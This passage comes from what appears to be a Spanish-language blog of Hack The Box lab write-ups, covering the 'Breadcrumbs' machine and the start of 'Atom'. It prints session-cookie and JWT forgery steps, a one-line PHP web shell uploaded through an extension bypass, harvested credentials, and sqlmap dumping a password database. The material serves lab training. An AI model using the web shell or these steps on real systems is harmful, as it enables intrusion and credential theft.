JWT::decode($jwt, $secret_key, array(\u0026#39;HS256\u0026#39;)); return $ret; } if($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] === \u0026#34;POST\u0026#34;){ $admins = array(\u0026#34;paul\u0026#34;); $user = validate()-\u0026gt;data-\u0026gt;username; if(in_array($user, $admins) \u0026amp;\u0026amp; $_SESSION[\u0026#39;username\u0026#39;] == \u0026#34;paul\u0026#34;){ error_reporting(E_ALL \u0026amp; ~E_NOTICE); $uploads_dir = \u0026#39;../uploads\u0026#39;; $tmp_name = $_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;]; $name = $_POST[\u0026#39;task\u0026#39;]; if(move_uploaded_file($tmp_name, \u0026#34;$uploads_dir/$name\u0026#34;)){ $ret = \u0026#34;Success. Have a great weekend!\u0026#34;; }else{ $ret = \u0026#34;Missing file or title :(\u0026#34; ; } }else{ $ret = \u0026#34;Insufficient privileges. Contact admin or developer to upload code. Note: If you recently registered, please wait for one of our admins to approve it.\u0026#34;; } echo $ret; } Asi mismo encontramos en cookie.php la forma en que se crea la cookie PHPSESSID.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // book=../portal/cookie.php\u0026amp;method=1 \u0026lt;?php /** * @param string $username Username requesting session cookie * * @return string $session_cookie Returns the generated cookie * * @devteam * Please DO NOT use default PHPSESSID; our security team says they are predictable. * CHANGE SECOND PART OF MD5 KEY EVERY WEEK * */ function makesession($username) { $max = strlen($username) - 1; $seed = rand(0, $max); $key = \u0026#34;s4lTy_stR1nG_\u0026#34; . $username[$seed] . \u0026#34;(!528./9890\u0026#34;; $session_cookie = $username . md5($key); return $session_cookie; } Analizando el codigo fuente de cookie.php vemos que crea multiples \u0026ldquo;sesiones\u0026rdquo; en total 4, por lo que modificamos el codigo y creamos las 4 sesiones para paul.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 π ~/htb/breadcrumbs ❯ cat session.php \u0026lt;?php function makesession($username){ $max = strlen($username) - 1; //$seed = rand(0, $max); \u0026lt;-- sesion con n random entre 1 - 4 (longitud de \u0026#39;paul\u0026#39;) for ($i = 0; $i \u0026lt;= $max; $i++) { $key = \u0026#34;s4lTy_stR1nG_\u0026#34; . $username[$i] . \u0026#34;(!528./9890\u0026#34;; $session_cookie = $username . md5($key); echo $i . \u0026#39; : \u0026#39; . $session_cookie; echo \u0026#34;\\n\u0026#34;; } } makesession(\u0026#39;paul\u0026#39;); ?\u0026gt; π ~/htb/breadcrumbs ❯ php session.php 0 : paula2a6a014d3bee04d7df8d5837d62e8c5 1 : paul61ff9d4aaefe6bdf45681678ba89ff9d 2 : paul8c8808867b53c49777fe5559164708c3 3 : paul47200b180ccd6835d25d034eeb6e6390 Y utilizando jwt.io creamos un token para el usuario paul tomando de base el token de un usuario registrado y la clave secreta.\nModificando el PHPSESSID y Token Jwt en firefox logramos acceder al portal y a File management como admin, vemos la opcion para subir de archivos.\nWEB-SHELL Podemos realizar la lectura de archivos, por lo que verificamos el codigo fuente de la pagina de File management, y encontramos en fileController.php que los archivos son subidos y movidos a /portal/uploads/, aunque solamente acepta archivos .zip, creamos un archivo con una \u0026ldquo;mini webshell\u0026rdquo;.\n1 \u0026lt;?php echo(system($_GET[\u0026#39;cmd\u0026#39;])); ?\u0026gt; Seleccionamos el archivo y agregamos el task, interceptamos la solicitud con burpsuite y modificamos la extension del task .php.\nEjecutamos whoami y vemos que el usuario es www-data.\n1 2 3 4 π ~/htb/breadcrumbs ❯ curl -s \u0026#34;https://10.10.10.228/portal/uploads/auo.zip.php?cmd=whoami\u0026#34; -k breadcrumbs\\www-data breadcrumbs\\www-data π ~/htb/breadcrumbs ❯ Juliette - USER Enumerando los diferentes archivos logramos encontrar la contraseña de juliette.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 π ~/htb/breadcrumbs ❯ curl -s -k \u0026#34;https://10.10.10.228/portal/uploads/uo.zip.php?cmd=type%20..\\pizzaDeliveryUserData\\*\u0026#34; [... REDACTED ...] { \u0026#34;pizza\u0026#34; : \u0026#34;margherita\u0026#34;, \u0026#34;size\u0026#34; : \u0026#34;large\u0026#34;,\t\u0026#34;drink\u0026#34; : \u0026#34;water\u0026#34;, \u0026#34;card\u0026#34; : \u0026#34;VISA\u0026#34;, \u0026#34;PIN\u0026#34; : \u0026#34;9890\u0026#34;, \u0026#34;alternate\u0026#34; : { \u0026#34;username\u0026#34; : \u0026#34;juliette\u0026#34;, \u0026#34;password\u0026#34; : \u0026#34;jUli901./())!\u0026#34;, } }{ \u0026#34;pizza\u0026#34; : \u0026#34;null\u0026#34;, \u0026#34;size\u0026#34; : \u0026#34;null\u0026#34;, \u0026#34;drink\u0026#34; : \u0026#34;null\u0026#34;, \u0026#34;card\u0026#34; : \u0026#34;null\u0026#34;, \u0026#34;PIN\u0026#34; : \u0026#34;null\u0026#34;, \u0026#34;alternate\u0026#34; : { \u0026#34;username\u0026#34; : \u0026#34;null\u0026#34;, \u0026#34;password\u0026#34; : \u0026#34;null\u0026#34;, } } [... REDACTED ...] π ~/htb/breadcrumbs ❯ Utilizamos esta contraseña en el servicio SSH, logramos obtener una shell y la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 Microsoft Windows [Version 10.0.19041.746] (c) 2020 Microsoft Corporation. All rights reserved. juliette@BREADCRUMBS C:\\Users\\juliette\u0026gt;whoami breadcrumbs\\juliette juliette@BREADCRUMBS C:\\Users\\juliette\u0026gt;type Desktop\\user.txt 1aec9d6b37ed9be9b87db57e3add8767 juliette@BREADCRUMBS C:\\Users\\juliette\u0026gt; Enumeracion SMB Access Verificamos el acceso en SMB, tenemos acceso de lectura al recurso Anouncements.\n1 2 3 4 5 6 7 8 9 10 11 π ~/htb/breadcrumbs ❯ crackmapexec smb -u juliette -p \u0026#39;jUli901./())!\u0026#39; --shares 10.10.10.228 SMB 10.10.10.228 445 BREADCRUMBS [*] Windows 10.0 Build 19041 x64 (name:BREADCRUMBS) (domain:Breadcrumbs) (signing:False) (SMBv1:False) SMB 10.10.10.228 445 BREADCRUMBS [+] Breadcrumbs\\juliette:jUli901./())! SMB 10.10.10.228 445 BREADCRUMBS [+] Enumerated shares SMB 10.10.10.228 445 BREADCRUMBS Share Permissions Remark SMB 10.10.10.228 445 BREADCRUMBS ----- ----------- ------ SMB 10.10.10.228 445 BREADCRUMBS ADMIN$ Remote Admin SMB 10.10.10.228 445 BREADCRUMBS Anouncements READ SMB 10.10.10.228 445 BREADCRUMBS C$ Default share SMB 10.10.10.228 445 BREADCRUMBS Development SMB 10.10.10.228 445 BREADCRUMBS IPC$ READ Remote IPC En el recurso solamente encontramos un archivo de texto pero no parece guiarnos a ningun lado.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 π ~/htb/breadcrumbs ❯ smbclient \\\\\\\\10.10.10.228\\\\Anouncements -U juliette Enter WORKGROUP\\juliette\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Fri Jan 15 19:03:48 2021 .. D 0 Fri Jan 15 19:03:48 2021 main.txt A 306 Fri Jan 15 19:06:10 2021 5082961 blocks of size 4096. 1598433 blocks available smb: \\\u0026gt; get main.txt getting file \\main.txt of size 306 as main.txt (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec) smb: \\\u0026gt; exit π ~/htb/breadcrumbs ❯ cat main.txt Rabbit Stew Celebration To celebrate the new library startup, a lunch will be held this upcoming Friday at 1 PM. Location: Room 201 block B Food: Rabbit Stew Hole Construction Please DO NOT park behind the contruction workers fixing the hole behind block A. Multiple complaints have been made. Development - USER Enumeracion Enumerando las carpetas de Juliette vemos un archivo html: todo.html, el cual contiene una lista de tareas y el estado de cada una.\n1 2 3 4 5 6 7 8 9 10 11 12 13 PS C:\\Users\\juliette\\Desktop\u0026gt; dir Directory: C:\\Users\\juliette\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 12/9/2020 6:27 AM 753 todo.html -ar--- 6/1/2021 11:38 AM 34 user.txt PS C:\\Users\\juliette\\Desktop\u0026gt; Sticky Notes Se destaca que las contraseñas podrian estar en Sticky Notes ya que el estado de esta tarea esta en progreso.\n1 Migrate passwords from the Microsoft Store Sticky Notes appli cation to our new password manager Tambien se menciona un administrador de contraseñas que posiblemente sea una aplicacion dentro de la maquina.\n1 Add new features to password manager Notes Data Encontramos como realizar un backup de Sticky Notes, vemos los archivos de informacion en C:\\Users\\juliette\\AppData\\Local\\Packages\n1 2 3 4 5 6 7 8 9 10 11 12 PS C:\\Users\\juliette\\AppData\\local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\u0026gt; dir Directory: C:\\Users\\juliette\\AppData\\local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 1/15/2021 4:10 PM 20480 15cbbc93e90a4d56bf8d9a29305b8981.storage.session -a---- 11/29/2020 3:10 AM 4096 plum.sqlite -a---- 1/15/2021 4:10 PM 32768 plum.sqlite-shm -a---- 1/15/2021 4:10 PM 329632 plum.sqlite-wal Copiamos los archivos utilizando un servidor de samba, y utilizando sqlite3 logramos obtener las notas de la base de datos sqlite, aunque solo se muestran las contraseñas de los usuarios Juliette y Development. Además grepeando todos los archivos tambien se muestra algun tipo de historial de las notas.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 # sudo impacket-smbserver -smb2support share . # copy * \\\\10.10.14.25\\share\\ π ~/htb/breadcrumbs/tmp ❯ ll total 380K -rwxr-xr-x 1 root root 20K Jan 15 19:10 15cbbc93e90a4d56bf8d9a29305b8981.storage.session -rwxr-xr-x 1 root root 4.0K Jan 15 19:09 plum.sqlite -rwxr-xr-x 1 root root 32K Jan 15 19:10 plum.sqlite-shm -rwxr-xr-x 1 root root 322K Jan 15 19:10 plum.sqlite-wal π ~/htb/breadcrumbs/tmp ❯ sqlite3 SQLite version 3.34.1 2021-01-20 14:10:07 Enter \u0026#34;.help\u0026#34; for usage hints. Connected to a transient in-memory database. Use \u0026#34;.open FILENAME\u0026#34; to reopen on a persistent database. sqlite\u0026gt; .open plum.sqlite sqlite\u0026gt; .tables Media Stroke SyncState User Note StrokeMetadata UpgradedNote sqlite\u0026gt; select * from Note; \\id=48c70e58-fcf9-475a-aea4-24ce19a9f9ec juliette: jUli901./())! \\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g \\id=48924119-7212-4b01-9e0f-ae6d678d49b2 administrator: [MOVED]|ManagedPosition=|1|0||Yellow|0|||||||0c32c3d8-7c60-48ae-939e-798df198cfe7|8e814e57-9d28-4288-961c-31c806338c5b|637423162765765332||637423163995607122 sqlite\u0026gt; Ingresamos a la maquina con las credenciales de development, enumeramos la maquina y vemos un archivo en C:\\Development.\n1 2 3 4 5 6 7 8 9 10 11 12 PS C:\\Development\u0026gt; dir Directory: C:\\Development Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 11/29/2020 3:11 AM 18312 Krypter_Linux PS C:\\Development\u0026gt; Root - USER SMB Encontramos en el recurso Development de samba el mismo archivo (Krypter_Linux), dicho archivo es un ejecutable.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 π ~/htb/breadcrumbs ❯ crackmapexec smb -u development -p \u0026#39;fN3)sN5Ee@g\u0026#39; --shares 10.10.10.228 SMB 10.10.10.228 445 BREADCRUMBS [*] Windows 10.0 Build 19041 x64 (name:BREADCRUMBS) (domain:Breadcrumbs) (signing:False) (SMBv1:False) SMB 10.10.10.228 445 BREADCRUMBS [+] Breadcrumbs\\development:fN3)sN5Ee@g SMB 10.10.10.228 445 BREADCRUMBS [+] Enumerated shares SMB 10.10.10.228 445 BREADCRUMBS Share Permissions Remark SMB 10.10.10.228 445 BREADCRUMBS ----- ----------- ------ SMB 10.10.10.228 445 BREADCRUMBS ADMIN$ Remote Admin SMB 10.10.10.228 445 BREADCRUMBS Anouncements READ SMB 10.10.10.228 445 BREADCRUMBS C$ Default share SMB 10.10.10.228 445 BREADCRUMBS Development READ SMB 10.10.10.228 445 BREADCRUMBS IPC$ READ Remote IPC π ~/htb/breadcrumbs ❯ smbclient \\\\\\\\10.10.10.228\\\\Development -U development Enter WORKGROUP\\development\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; dir . D 0 Fri Jan 15 19:03:49 2021 .. D 0 Fri Jan 15 19:03:49 2021 Krypter_Linux A 18312 Sun Nov 29 06:11:56 2020 5082961 blocks of size 4096. 1596652 blocks available smb: \\\u0026gt; get Krypter_Linux getting file \\Krypter_Linux of size 18312 as Krypter_Linux (41.7 KiloBytes/sec) (average 41.7 KiloBytes/sec) smb: \\\u0026gt; exit π ~/htb/breadcrumbs ❯ file Krypter_Linux Krypter_Linux: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ab1fa8d6929805501e1793c8b4ddec5c127c6a12, for GNU/Linux 3.2.0, not stripped π ~/htb/breadcrumbs ❯ ./Krypter_Linux Krypter V1.2 New project by Juliette. New features added weekly! What to expect next update: - Windows version with GUI support - Get password from cloud and AUTOMATICALLY decrypt! *** No key supplied. USAGE: Krypter \u0026lt;key\u0026gt; Krypter Verificamos el archivo utilizando Ghidra, vemos que dicho archivo realiza algun tipo de solicitud hacia la direccion passmanager.htb, dicha direccion no existe en los archivos de configuracion de xampp y etc\\hosts de la maquina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 if (local_28 != 0) { puts(\u0026#34;Requesting decryption key from cloud...\\nAccount: Administrator\u0026#34;); curl_easy_setopt(local_28,0x2712,\u0026#34;http://passmanager.htb:1234/index.php\u0026#34;); curl_easy_setopt(local_28,0x271f,\u0026#34;method=select\u0026amp;username=administrator\u0026amp;table=passwords\u0026#34;); curl_easy_setopt(local_28,0x4e2b,WriteCallback); curl_easy_setopt(local_28,0x2711,local_58); local_2c = curl_easy_perform(local_28); curl_easy_cleanup(local_28); puts(\u0026#34;Server response:\\n\\n\u0026#34;); this = std::operator\u0026lt;\u0026lt;((basic_ostream *)std::cout,local_58); std::basic_ostream\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;::operator\u0026lt;\u0026lt; ((basic_ostream\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt; *)this, std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); } Al verificar el puerto 1234, vemos que está a la escucha localmente.\n1 2 3 4 5 6 7 8 9 PS C:\\Development\u0026gt; netstat -ano | select-string 1234 TCP 127.0.0.1:1234 0.0.0.0:0 LISTENING 2928 TCP 127.0.0.1:1234 127.0.0.1:61143 TIME_WAIT 0 TCP 127.0.0.1:1234 127.0.0.1:61145 FIN_WAIT_2 2928 TCP 127.0.0.1:61145 127.0.0.1:1234 CLOSE_WAIT 2056 PS C:\\Development\u0026gt; Proxychains Obtuvimos el puerto localmente mediante SOCKS5 SSH tunnel y ProxyChains.\n1 2 3 4 5 6 7 8 9 10 11 12 13 # ssh -D 1337 -q -C -N development@10.10.10.228 # fN3)sN5Ee@g π ~/htb/breadcrumbs ❯ cat /etc/proxychains4.conf |grep -v \u0026#34;#\u0026#34; strict_chain proxy_dns remote_dns_subnet 224 tcp_read_time_out 15000 tcp_connect_time_out 8000 [ProxyList] socks4 127.0.0.1 1337 Al visitar el puerto 1234 con la solicitud que realiza el ejecutable vemos una clave AES (k19D193j.\u0026lt;19391(), tambien, esta \u0026ldquo;aplicacion/pagina\u0026rdquo; podria relacionarse con el nuevo administrador de contraseñas que se menciona en las tareas.\nSQLi - SQLMap Modificando la solicitud observamos un tipo de error en la solicitud, tomamos esto en cuenta para ejecutar SQLmap.\nObtuvimos informacion de la base de datos bread que incluye la contraseña encriptada en AES del usuario Administrator.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 # proxychains4 -q sqlmap -u \u0026#34;http://127.0.0.1:1234/index.php?method=select\u0026amp;username=administrator\u0026amp;table=passwords\u0026#34; --dbs --batch available databases [2]: [*] bread [*] information_schema Database: bread [1 table] +-----------+ | passwords | +-----------+ Database: bread Table: passwords [1 entry] +----+---------------+------------------+----------------------------------------------+ | id | account | aes_key | password | +----+---------------+------------------+----------------------------------------------+ | 1 | Administrator | k19D193j.\u0026lt;19391( | H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw= | +----+---------------+------------------+----------------------------------------------+ Utilizamos devglan para obtener la contraseña en texto plano.\nShell Ingresamos por SSH, obtuvimos una shell y la flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 Microsoft Windows [Version 10.0.19041.746] (c) 2020 Microsoft Corporation. All rights reserved. administrator@BREADCRUMBS C:\\Users\\Administrator\u0026gt;whoami breadcrumbs\\administrator administrator@BREADCRUMBS C:\\Users\\Administrator\u0026gt;powershell Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. Try the new cross-platform PowerShell https://aka.ms/pscore6 PS C:\\Users\\Administrator\u0026gt; cd .\\Desktop\\ PS C:\\Users\\Administrator\\Desktop\u0026gt; dir Directory: C:\\Users\\Administrator\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 1/15/2021 4:03 PM passwordManager -ar--- 6/1/2021 11:38 AM 34 root.txt PS C:\\Users\\Administrator\\Desktop\u0026gt; cat .\\root.txt c7810478e810a3ab65532c0cb04fa740 PS C:\\Users\\Administrator\\Desktop\u0026gt; ","description":"Breadcrumbs expone un sitio web donde descubrimos una vulnerabilidad LFI la cual nos proporcionó la informacion para obtener acceso como admin, para luego obtener credenciales y acceder por SSH. Obtuvimos acceso al siguiente usuario con credenciales en la aplicacion de Notas de Windows. Con Proxychains creamos un tunnel para acceder a una aplicacion donde encontramos la contraseña del administrador.","id":56,"section":"posts","tags":["lfi","jwt","smb","sticky notes","sqlite","proxychains","sqlmap"],"title":"Hack The Box - Breadcrumbs","uri":"https://sckull.github.io/posts/breadcrumbs/"},{"content":"\rAtom presenta una aplicacion Electron. Explotamos una vulnerabilidad en un modulo de actualizacion que permitio ejecutar comandos a través de un archivo de actualizacion y acceso al servidor de actualizaciones. Obtuvimos credenciales a través de Portable Kanban lo que nos dio acceso a Redis donde encontramos la contraseña del administrador. Tambien, por medio de Redis escribimos una web shell que nos dio acceso privilegiado.\nNombre Atom OS Windows Puntos 30 Dificultad Media IP 10.10.10.237 Maker MrR3boot\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[6.1, 4.7, 4.8, 5.2, 5.3],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[6, 10, 5, 5, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} NMAP Escaneo de puertos con nmap nos muestra el puerto http (80), RPC (135), https (443) abiertos, samba (445) y el puerto redis (6379).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 # Nmap 7.91 scan initiated Wed May 5 19:48:52 2021 as: nmap -p- --min-rate 10000 -oN allports -Pn 10.10.10.237 Nmap scan report for 10.10.10.237 (10.10.10.237) Host is up (0.14s latency). Not shown: 65530 filtered ports PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 443/tcp open https 445/tcp open microsoft-ds 6379/tcp open redis # Nmap done at Wed May 5 19:49:30 2021 -- 1 IP address (1 host up) scanned in 38.47 seconds # Nmap 7.91 scan initiated Wed May 5 19:50:09 2021 as: nmap -Pn -p80,135,443,445,6379 -sV -sC -oN serviceports 10.10.10.237 Nmap scan report for 10.10.10.237 (10.10.10.237) Host is up (0.069s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27) | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27 |_http-title: Heed Solutions 135/tcp open msrpc Microsoft Windows RPC 443/tcp open ssl/http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27) | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27 |_http-title: Heed Solutions | ssl-cert: Subject: commonName=localhost | Not valid before: 2009-11-10T23:48:47 |_Not valid after: 2019-11-08T23:48:47 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 445/tcp open microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP) 6379/tcp open redis Redis key-value store Service Info: Host: ATOM; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2h30m27s, deviation: 4h02m30s, median: 10m26s | smb-os-discovery: | OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3) | OS CPE: cpe:/o:microsoft:windows_10::- | Computer name: ATOM | NetBIOS computer name: ATOM\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2021-05-05T17:00:56-07:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-05-06T00:00:57 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed May 5 19:51:07 2021 -- 1 IP address (1 host up) scanned in 57.87 seconds RPC Utilizamos rpcclient con una sesion nulla pero no tenemos permisos de acceso.\n1 2 λ ~ rpcclient -U \u0026#39;\u0026#39; -N 10.10.10.237 Cannot connect to server. Error was NT_STATUS_ACCESS_DENIED ENUM HTTP Encontramos una pagina web en el puerto 80 donde se presenta el software Heed en su version 1.0.0\nGOBUSTER Gobuster mostró el mismo resultado para el puerto http (80) y https (443).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 λ ~/htb/atom gobuster dir -u http://atom.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -t 50 -x php,html,txt,xml /index.html (Status: 200) [Size: 7581] /images (Status: 301) [Size: 330] [--\u0026gt; http://atom.htb/images/] /Images (Status: 301) [Size: 330] [--\u0026gt; http://atom.htb/Images/] /releases (Status: 301) [Size: 332] [--\u0026gt; http://atom.htb/releases/] /Index.html (Status: 200) [Size: 7581] /examples (Status: 503) [Size: 398] /licenses (Status: 403) [Size: 417] /IMAGES (Status: 301) [Size: 330] [--\u0026gt; http://atom.htb/IMAGES/] /%20 (Status: 403) [Size: 298] /INDEX.html (Status: 200) [Size: 7581] /Releases (Status: 301) [Size: 332] [--\u0026gt; http://atom.htb/Releases/] /server-status (Status: 403) [Size: 417] λ ~/htb/atom gobuster dir -u https://atom.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -t 50 -x php,html,txt,xml -k /images (Status: 301) [Size: 332] [--\u0026gt; https://atom.htb/images/] /index.html (Status: 200) [Size: 7581] /Images (Status: 301) [Size: 332] [--\u0026gt; https://atom.htb/Images/] /releases (Status: 301) [Size: 334] [--\u0026gt; https://atom.htb/releases/] /Index.html (Status: 200) [Size: 7581] /examples (Status: 503) [Size: 399] /licenses (Status: 403) [Size: 418] /IMAGES (Status: 301) [Size: 332] [--\u0026gt; https://atom.htb/IMAGES/] /%20 (Status: 403) [Size: 299] /INDEX.html (Status: 200) [Size: 7581] /Releases (Status: 301) [Size: 334] [--\u0026gt; https://atom.htb/Releases/] /server-status (Status: 403) [Size: 418] HEED Encontramos un archivo zip el cual contiene el software presentado en la pagina, al extraerlo vemos un ejecutable.\n1 2 λ ~/htb/atom/tmp ls heed_setup_v1.0.0.zip \u0026#39;heedv1 Setup 1.0.0.exe\u0026#39; El ejecutable parece ser un instalador, con winrar logramos obtener los archivos los cuales pertenecen a una aplicacion escrita con en Electron.\nVemos un archivo yaml (app-update.yml) el cual contiene una direccion que aparentemente es para realizar la actualizacion de la aplicacion.\n1 2 3 4 provider: generic url: \u0026#39;http://updates.atom.htb\u0026#39; publisherName: - HackTheBox La aplicacion solo crea y elimina notas, y al iniciar busca actualizaciones.\nHEED CODE Utilizando npx con al archivo app.asar logramos obtener el codigo fuente, no encontramos direcciones de base de datos, la aplicacion solo funciona de forma local y temporal en cuanto a la informacion.\n1 2 # extract npx asar extract app.asar app_extract Vemos que utiliza un modulo para \u0026ldquo;actualizar\u0026rdquo; la aplicacion: electron-updater - ^2.23.3.\n1 2 3 4 5 6 7 8 9 10 11 12 { \u0026#34;name\u0026#34;: \u0026#34;heedv2\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;2.0.0\u0026#34;, \u0026#34;main\u0026#34;: \u0026#34;main.js\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;Open Source Application provided by HackTheBox\u0026#34;, \u0026#34;author\u0026#34;: \u0026#34;MrR3boot\u0026#34;, \u0026#34;dependencies\u0026#34;: { \u0026#34;electron-log\u0026#34;: \u0026#34;^1.3.0\u0026#34;, \u0026#34;electron-updater\u0026#34;: \u0026#34;^2.23.3\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;^0.11.0\u0026#34; } } ENUM SAMBA CME Utilizamos esta herramienta para obtener informacion del servicio de SAMBA con una sesion null, vemos los recursos compartidos, tenemos permisos en el recurso Software_Updates.\n1 2 3 4 5 6 7 8 9 10 11 λ ~/htb/atom cme smb --shares atom.htb -u \u0026#39;null\u0026#39; -p \u0026#39;null\u0026#39; SMB 10.10.10.237 445 ATOM [*] Windows 10 Pro 19042 x64 (name:ATOM) (domain:ATOM) (signing:False) (SMBv1:True) SMB 10.10.10.237 445 ATOM [+] ATOM\\null:null SMB 10.10.10.237 445 ATOM [+] Enumerated shares SMB 10.10.10.237 445 ATOM Share Permissions Remark SMB 10.10.10.237 445 ATOM ----- ----------- ------ SMB 10.10.10.237 445 ATOM ADMIN$ Remote Admin SMB 10.10.10.237 445 ATOM C$ Default share SMB 10.10.10.237 445 ATOM IPC$ Remote IPC SMB 10.10.10.237 445 ATOM Software_Updates READ,WRITE λ ~/htb/atom SMBCLIENT Con smbclient logramos enumerar el recurso donde vemos un archivo pdf.\n1 2 3 4 5 6 7 8 9 10 11 12 λ ~/htb/atom smbclient \\\\\\\\atom.htb\\\\Software_updates -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Thu May 6 02:17:47 2021 .. D 0 Thu May 6 02:17:47 2021 client1 D 0 Thu May 6 02:17:47 2021 client2 D 0 Thu May 6 02:17:47 2021 client3 D 0 Thu May 6 02:17:47 2021 UAT_Testing_Procedures.pdf A 35202 Fri Apr 9 07:18:08 2021 4413951 blocks of size 4096. 1262822 blocks available smb: \\\u0026gt; El archivo es la documentacion del equipo de QA \u0026hellip; menciona que antes de liberar una nueva version se realizan pruebas por parte del equipo, y para ello se debe de colocar en las carpetas de \u0026ldquo;cliente\u0026rdquo;, las cuales encontramos en el recurso Software_Updates aunque no especifica si es un archivo ejecutable.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 Heedv1.0 Internal QA Documentation What is Heed ? Note taking application built with electron-builder which helps users in taking important notes. Features ? Very limited at the moment. There’s no server interaction when creating notes. So currently it just acts as a one-tier thick client application. We are planning to move it to a full fledged two-tier architecture sometime in the future releases. What about QA ? We follow the below process before releasing our products. 1. Build and install the application to make sure it works as we expect it to be. 2. Make sure that the update server running is in a private hardened instance. To initiate the QA process, just place the updates in one of the \u0026#34;client\u0026#34; folders, and the appropriate QA team will test it to ensure it finds an update and installs it correctly. 3. Follow the checklist to see if all given features are working as expected by the developer. JASON - USER RCE - ELECTRON-UPDATER Realizamos una busqueda de vulnerabilidades en Electron Updater y encontramos un post en el que explica que con un archivo .yml es posible ejecutar un exe y comandos, modificando la direccion url y path. En cuanto al exe, es decir 